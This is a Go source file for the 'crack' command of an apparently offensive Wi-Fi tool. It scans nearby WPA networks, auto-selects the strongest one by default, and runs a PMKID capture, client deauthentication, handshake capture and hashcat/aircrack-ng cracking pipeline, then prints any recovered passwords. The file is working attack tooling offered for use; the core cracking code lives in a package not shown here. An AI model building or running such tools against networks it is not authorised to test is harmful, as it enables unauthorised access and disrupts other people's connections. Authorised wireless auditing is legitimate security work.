// Copyright (C) 2026 Mikko Parkkola. All rights reserved.
// Licensed under AGPL-3.0. See LICENSE file.

package cli

import (
	"fmt"
	"strings"
	"time"

	"github.com/MikkoParkkola/nowifi/internal/crack"
	"github.com/spf13/cobra"
)

var (
	crackTarget   string
	crackTimeout  int
	crackWordlist string
	crackScanOnly bool
)

var crackCmd = &cobra.Command{
	Use:   "crack",
	Short: "Crack WPA/WPA2 passwords",
	Long: `Crack WPA/WPA2 passwords (PMKID + handshake capture + hashcat).

Pipeline (ordered by effectiveness):
  1. PMKID capture     — client-less, ~60% of APs vulnerable
  2. Handshake capture — deauth a client, capture 4-way handshake
  3. Hashcat crack     — GPU-accelerated dictionary/brute-force
  4. Aircrack-ng       — CPU fallback if hashcat unavailable

On macOS, monitor mode requires an external USB WiFi adapter
(e.g., Alfa AWUS036ACH). The built-in card does not support it.

Examples:
  sudo nowifi crack                           # Scan + crack strongest WPA network
  sudo nowifi crack -t "MyWiFi"               # Target a specific SSID
  sudo nowifi crack --scan-only               # Just scan, don't attack
  sudo nowifi crack -w ~/wordlists/rockyou.txt  # Use specific wordlist`,
	Run: runCrack,
}

func init() {
	crackCmd.Flags().StringVarP(&crackTarget, "target", "t", "",
		"Target SSID (empty = scan and pick strongest)")
	crackCmd.Flags().IntVar(&crackTimeout, "timeout", 300,
		"Max time for capture phase (seconds)")
	crackCmd.Flags().StringVarP(&crackWordlist, "wordlist", "w", "",
		"Path to wordlist file")
	crackCmd.Flags().BoolVar(&crackScanOnly, "scan-only", false,
		"Only scan for targets, don't crack")
}

func runCrack(cmd *cobra.Command, args []string) {
	fmt.Printf("\nnowifi v%s — WPA Cracking\n\n", version)

	iface := flagInterface

	// --- Scan phase ---
	fmt.Printf("1. Scanning  (interface: %s)\n", iface)
	targets, err := crack.ScanTargets(iface, 10)
	if err != nil {
		fmt.Printf("   %s Scan failed: %v\n\n", red("ERROR"), err)
		return
	}

	if len(targets) == 0 {
		fmt.Println("   No WPA networks found.")
		fmt.Println()
		return
	}

	// Display scan results table.
	fmt.Println()
	fmt.Printf("   %-28s  %s  %-6s  %-14s  %s\n",
		bold("SSID"), bold("Signal"), bold("Ch"), bold("Security"), bold("BSSID"))
	fmt.Printf("   %s\n", dim(strings.Repeat("-", 80)))
	for _, t := range targets {
		ssid := t.SSID
		if ssid == "" {
			ssid = dim("<hidden>")
		}
		if len(ssid) > 28 {
			ssid = ssid[:25] + "..."
		}
		fmt.Printf("   %-28s  %4ddBm  %-6d  %-14s  %s\n",
			ssid, t.Signal, t.Channel, t.Security, dim(t.BSSID))
	}
	fmt.Printf("\n   %s networks found\n", bold(fmt.Sprintf("%d", len(targets))))

	if crackScanOnly {
		fmt.Println("\n   Scan-only mode. Exiting.")
		fmt.Println()
		return
	}

	// --- Crack phase ---
	fmt.Println("\n2. Cracking")
	if crackTarget != "" {
		fmt.Printf("   Target: %s\n", crackTarget)
	} else {
		fmt.Println("   Target: (auto-select strongest WPA network)")
	}
	if crackWordlist != "" {
		fmt.Printf("   Wordlist: %s\n", crackWordlist)
	}
	fmt.Printf("   Timeout: %ds\n\n", crackTimeout)

	timeout := time.Duration(crackTimeout) * time.Second
	results, err := crack.RunCrack(iface, crackTarget, crackWordlist, timeout)
	if err != nil {
		fmt.Printf("   %s Crack failed: %v\n\n", red("ERROR"), err)
		return
	}

	// --- Results ---
	fmt.Println("\n3. Results")
	fmt.Println()
	fmt.Printf("   %-24s  %-10s  %s\n", bold("Technique"), bold("Result"), bold("Details"))
	fmt.Printf("   %s\n", dim(strings.Repeat("-", 70)))

	successCount := 0
	for _, r := range results {
		resultStr := red("failed")
		if r.Success {
			resultStr = green("SUCCESS")
			successCount++
		}
		details := r.Details
		if r.Password != "" {
			details = fmt.Sprintf("Password: %s", green(r.Password))
		}
		fmt.Printf("   %-24s  %-10s  %s\n", string(r.Method), resultStr, details)
	}

	fmt.Println()
	if successCount > 0 {
		fmt.Printf("   %s — %d technique(s) succeeded\n", green("Done"), successCount)
	} else {
		fmt.Printf("   %s — no techniques succeeded\n", yellow("Done"))
	}
	fmt.Println()
}
